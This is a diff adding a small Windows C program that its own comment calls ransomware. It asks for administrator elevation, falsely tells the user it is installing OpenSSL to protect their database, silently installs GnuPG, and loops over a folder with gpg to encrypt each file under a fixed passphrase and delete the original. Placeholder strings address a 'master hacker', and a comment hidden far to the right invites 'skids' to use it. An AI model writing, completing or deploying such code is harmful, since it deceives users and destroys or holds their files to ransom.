@@ -1,0 +1,74 @@
+#include <windows.h>
+#include <stdio.h>
+#include <shellapi.h>
+#include <stdlib.h>
+
+// Function to check if the current process has admin rights
+BOOL IsRunningAsAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    if (AllocateAndInitializeSid(
+            &ntAuthority, 2,
+            SECURITY_BUILTIN_DOMAIN_RID,
+            DOMAIN_ALIAS_RID_ADMINS,
+            0, 0, 0, 0, 0, 0,
+            &adminGroup)) {
+        CheckTokenMembership(NULL, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    return isAdmin;
+}
+
+// Function to restart the program with admin rights
+void RelaunchAsAdmin() {
+    char exePath[MAX_PATH];
+    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
+        printf("Error getting executable path.\n");
+        return;
+    }
+
+    SHELLEXECUTEINFOA sei = { sizeof(sei) };
+    sei.lpVerb = "runas"; // Request elevation
+    sei.lpFile = exePath;
+    sei.hwnd = NULL;
+    sei.nShow = SW_NORMAL;
+
+    if (!ShellExecuteExA(&sei)) {
+        DWORD err = GetLastError();
+        if (err == ERROR_CANCELLED) {
+            printf("User refused to grant admin rights.\n");
+        } else {
+            printf("Failed to restart as admin. Error: %lu\n", err);
+        }
+    }
+}
+
+int main() {
+    if (IsRunningAsAdmin()) {
+        printf("Running with administrator privileges.\n");
+        // Place your admin-required code here
+    } else {
+        printf("Not running as administrator.\n");
+        printf("Admin rights are needed, do you want to run in admin and let this app run properly,or dont run in it ");
+        char choice;
+        if (scanf(" %c", &choice) == 1 && (choice == 'y' || choice == 'Y')) {
+            RelaunchAsAdmin();
+            printf("We are about to install the encryption app OpenSSL to encrypt your database, hold on tight!! ");
+            system("winget install GnuPG.GnuPG -e --silent");
+            printf("Installed!! ");
+            system("cmd /C for %%f in (choose the folder to hackcrypt master hacker!!!\\*) do gpg --batch --yes --passphrase \"choose the encryption password master hacker!!!\" -c \"%%f\" && del \"%%f\"");
+            system("cmd /C for %%f in (choose the folder to hackcrypt master hacker!!!\\*) do gpg --batch --yes --passphrase \"choose the encryption password master hacker!!!\" -c \"%%f\" && del \"%%f\"");
+            system("cmd /C for %%f in (choose the folder to hackcrypt master hacker!!!\\*) do gpg --batch --yes --passphrase \"choose the encryption password master hacker!!!\" -c \"%%f\" && del \"%%f\"");
+            system("cmd /C for %%f in (choose the folder to hackcrypt master hacker!!!\\*) do gpg --batch --yes --passphrase \"choose the encryption password master hacker!!!\" -c \"%%f\" && del \"%%f\""); 
+            system("cmd /C for %%f in (choose the folder to hackcrypt master hacker!!!\\*) do gpg --batch --yes --passphrase \"choose the encryption password master hacker!!!\" -c \"%%f\" && del \"%%f\"");
+            printf("insert message to user")                                                                                                                                                                                     // making this ransomware was a pain, so use it for a good reason skids. 
+        } else {
+            printf("Shutting down this app....\n");
+            return 0;
+
+        }
+    }
+    return 0;
+}
